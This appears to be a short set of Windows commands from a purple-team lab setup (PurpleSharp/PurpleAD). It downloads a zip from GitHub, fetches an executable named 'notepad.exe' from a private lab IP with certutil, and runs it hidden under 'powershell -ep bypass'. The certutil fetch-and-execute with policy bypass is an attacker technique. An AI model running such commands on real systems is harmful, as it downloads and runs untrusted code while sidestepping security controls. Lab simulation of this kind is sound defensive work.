iwr -Uri "https://github.com/mvelazc0/PurpleAD/archive/refs/heads/main.zip" -outfile "C:\Tools\PurpleSharp\playbooks.zip"
certutil -urlcache -f http://192.168.56.110/notepad.exe C:\tmp\notepad.exe
powershell -ep bypass -Command 'Start-Process -NoNewWindow -FilePath "C:\tmp\notepad.exe"'
